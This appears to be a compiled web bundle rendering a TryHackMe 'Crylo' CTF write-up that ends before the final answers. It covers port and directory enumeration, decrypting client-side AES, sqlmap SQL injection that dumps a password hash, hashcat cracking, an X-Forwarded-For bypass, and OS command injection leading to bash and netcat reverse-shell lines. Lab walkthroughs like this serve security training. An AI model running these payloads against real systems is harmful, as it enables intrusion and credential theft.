"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[6720],{5609:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>h,contentTitle:()=>a,default:()=>l,frontMatter:()=>i,metadata:()=>o,toc:()=>c});var t=s(4848),r=s(8453);const i={},a="Crylo",o={id:"writeups/thm/2023/crylo",title:"Crylo",description:"A writeup for the room Crylo on TryHackMe.",source:"@site/docs/writeups/thm/2023/crylo.md",sourceDirName:"writeups/thm/2023",slug:"/writeups/thm/2023/crylo",permalink:"/docs/writeups/thm/2023/crylo",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/thm/2023/crylo.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Cat Pictures 2",permalink:"/docs/writeups/thm/2023/cat-pictures-2"},next:{title:"Devie",permalink:"/docs/writeups/thm/2023/devie"}},h={},c=[{value:"Task 1 - Enumeration",id:"task-1---enumeration",level:2},{value:"Task 2 - Injection",id:"task-2---injection",level:2},{value:"Task 3 - Encryption",id:"task-3---encryption",level:2},{value:"Task 4 - Forbidden Bypass",id:"task-4---forbidden-bypass",level:2},{value:"Task 5 - Exploitation",id:"task-5---exploitation",level:2}];function d(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",p:"p",pre:"pre",...(0,r.R)(),...e.components},{Image:s}=n;return s||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Image",!0),(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"crylo",children:"Crylo"}),"\n",(0,t.jsxs)(n.p,{children:["A writeup for the room ",(0,t.jsx)(n.a,{href:"https://tryhackme.com/room/crylo4a",children:"Crylo"})," on TryHackMe."]}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"Learn about the CryptoJS library and JavaScript-based client-side encryption and decryption."}),"\n"]}),"\n",(0,t.jsx)(s,{src:"https://tryhackme-images.s3.amazonaws.com/room-icons/af0e7c2109847033d31d273498657526.png",width:"128"}),"\n",(0,t.jsx)(n.h2,{id:"task-1---enumeration",children:"Task 1 - Enumeration"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"How many ports are open?"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Start the machine and scan the ports with nmap."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"nmap -sS -p- -v [IP]\n"})}),"\n",(0,t.jsx)(s,{src:"/images/writeups/thm/2023/crylo/nmap.png"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What is the 403/forbidden web page?"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Open the web page in the browser and check the source code."}),"\n",(0,t.jsx)(n.p,{children:"Other pages return a 404 error."}),"\n",(0,t.jsx)(s,{src:"/images/writeups/thm/2023/crylo/homepage.png"}),"\n",(0,t.jsx)(n.p,{children:"Nothing seems to be interesting, so we can try to enumerate the website with gobuster."}),"\n",(0,t.jsxs)(n.p,{children:["It is important to set the ",(0,t.jsx)(n.code,{children:"-s"})," flag to search for at least the 403 status code."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,css,js -q -s "200,403" -u [URL]\n'})}),"\n",(0,t.jsx)(s,{src:"/images/writeups/thm/2023/crylo/gobuster.png"}),"\n",(0,t.jsx)(n.h2,{id:"task-2---injection",children:"Task 2 - Injection"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What is the name of the first username?"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"It is a common name for the default user of a web application."}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What is the password for the above user?"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"We can try to login with common credentials, but nothing tried works."}),"\n",(0,t.jsx)(s,{src:"/images/writeups/thm/2023/crylo/login.png"}),"\n",(0,t.jsx)(n.p,{children:"Looking to the response we can see that the final text cannot be parsed directly."}),"\n",(0,t.jsx)(n.p,{children:"However, the client understands it perfectly and shows the result."}),"\n",(0,t.jsx)(n.p,{children:"It is possible to look to the code to find how it works."}),"\n",(0,t.jsx)(s,{src:"/images/writeups/thm/2023/crylo/code-login.png"}),"\n",(0,t.jsx)(n.p,{children:"The client decrypts the response using the CryptoJS library."}),"\n",(0,t.jsx)(n.p,{children:"The response is encrypted using the AES algorithm with the CBC mode and a hardcode string as key and IV."}),"\n",(0,t.jsx)(n.p,{children:"Using Cyberchef it is possible to convert the response and see its content."}),"\n",(0,t.jsx)(s,{src:"/images/writeups/thm/2023/crylo/decrypt-response.png"}),"\n",(0,t.jsx)(n.p,{children:"Now that the request is known, we can try sqlmap to see if it is vulnerable to SQL injection."}),"\n",(0,t.jsxs)(n.p,{children:["The easy way to manage the request is to save it in a file and use the ",(0,t.jsx)(n.code,{children:"-r"})," flag."]}),"\n",(0,t.jsxs)(n.p,{children:["Using the standard risk level is not enough, add ",(0,t.jsx)(n.code,{children:"--risk=3 --level=3"})," to increase it and find a vulnerability."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'# Enumerate databases\nsqlmap -r request --risk=3 --level=3 --dbs\n\n# Enumerate tables in food database\nsqlmap -r request --risk=3 --level=3 --tables -D food\n\n# Dump auth data to get the hash of the admin password\nsqlmap -r request --risk=3 --level=3 --dump -T auth_user -D food\nsqlmap -r request --risk=3 --level=3 --dump -T auth_user -D food --data "username=admin" -C password\n'})}),"\n",(0,t.jsx)(n.p,{children:"Follow the default answer for all questions except:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n\n"})}),"\n",(0,t.jsx)(n.p,{children:"We can obtain a hash of the admin password that be cracked with a tool like hashcat."}),"\n",(0,t.jsx)(n.p,{children:"Analyzing the hash with hashid we can find the hash type is Django (PBKDF2-SHA256)."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'# Save hash in a file\necho "pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=" > hash.txt\n\n# Get hash type for hashcat\nhashid -m hash.txt\n\n# Crack the hash with mode 10000 (Django (PBKDF2-SHA256))\nhashcat -m 10000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n'})}),"\n",(0,t.jsx)(s,{src:"/images/writeups/thm/2023/crylo/hashcat.png"}),"\n",(0,t.jsx)(n.h2,{id:"task-3---encryption",children:"Task 3 - Encryption"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"Which library is used for encryption and decryption?"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["Look in ",(0,t.jsx)(n.code,{children:"/static/js/validation.js"})," to find the answer."]}),"\n",(0,t.jsx)(n.p,{children:"The library can be easily recognized by the capitalized name of the variable."}),"\n",(0,t.jsx)(s,{src:"/images/writeups/thm/2023/crylo/encryption.png"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"Which JSON parameter was used to validate the pin?"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["Look in ",(0,t.jsx)(n.code,{children:"/static/js/validation.js"})," to find the answer."]}),"\n",(0,t.jsx)(n.p,{children:"There is a specific if statement for the pin parameter."}),"\n",(0,t.jsx)(s,{src:"/images/writeups/thm/2023/crylo/pin-set.png"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"Which encryption method is used?"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["Look in ",(0,t.jsx)(n.code,{children:"/static/js/validation.js"})," to find the answer."]}),"\n",(0,t.jsx)(n.p,{children:"At the beginning of the file there is a comment that says that the encryption method is AES."}),"\n",(0,t.jsx)(n.h2,{id:"task-4---forbidden-bypass",children:"Task 4 - Forbidden Bypass"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What extra header can be used to bypass the page?"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["Firstly, bypass the login changing the value of ",(0,t.jsx)(n.code,{children:"pin_set"})," to ",(0,t.jsx)(n.code,{children:"false"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:'{"pin_set": "true", "email": "admin@admin.com", "success": "true"}\niL6SVLGiiyY47lh6kX353MqD9I+mcSncHWhuJl6Dg7umFTYotHmMKiPaluJ8J35LebkAv3FSyusGIO8rxwJztzwHX9Ot64ltTlbzi/spfQ4=\n\n{"pin_set": "false", "email": "admin@admin.com", "success": "true"}\nHS0kn8CQhTz7NwgLMw9tP1mWXHssgMd2MRJ9EeChrTiPlSg9HGgxyshgHbMYjhFnVbpEi5lm1bRMbgbdebHsfVsN+90GzIuDMX+SBBI9wdY=\n'})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What extra header can be used to bypass the page?"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["Use the ",(0,t.jsx)(n.code,{children:"X-Forwarded-For"})," header to bypass the IP check."]}),"\n",(0,t.jsx)(n.p,{children:"It can be easily added using Burp Suite."}),"\n",(0,t.jsx)(n.p,{children:"Be careful to always add the header before sending any request."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"X-Forwarded-For: 127.0.0.1\n"})}),"\n",(0,t.jsx)(n.p,{children:"Once the header is added, you will see a simple input text and a submit button."}),"\n",(0,t.jsx)(n.p,{children:"Send a request and move it to the repeater to simplify the work."}),"\n",(0,t.jsx)(n.p,{children:"We can check for remote code execution using the following payload."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"22 && sleep 10\n"})}),"\n",(0,t.jsx)(n.p,{children:"We can see that the command is executed, so we can try to get a reverse shell."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"ifconfig\nnc -nlvp 1337\n22 && bash -i >& /dev/tcp/[IP]/1337 0>&1\n22 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.172.114 1337 >/tmp/f\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-5---exploitation",children:"Task 5 - Exploitation"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What is the name of the vulnerability used to gain system access?"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"The vulnerability that we exploited is based on the debug form."}),"\n",(0,t.jsx)(n.p,{children:"We can send OS commands to be executed on the target server."}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://portswigger.net/kb/issues/00100100_os-command-injection",children:"https://portswigger.net/kb/issues/00100100_os-command-injection"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What is the current system\u2019s username?"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["Once you obtain a reverse shell is enough to run ",(0,t.jsx)(n.code,{children:"whoami"})," to get the answer."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"whoami\n"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What is the user flag?"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Go to the home directory of the user to find the flag."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"cd\ncat user.txt\n"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"Which user is part of the sudo group?"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"It is enough to check the sudo group to find the answer."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"getent group sudo\n"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What is the password for the above user?"}),"\n"]}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"What is the root flag?"}),"\n"]})]})}function l(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>o});var t=s(6540);const r={},i=t.createContext(r);function a(e){const n=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);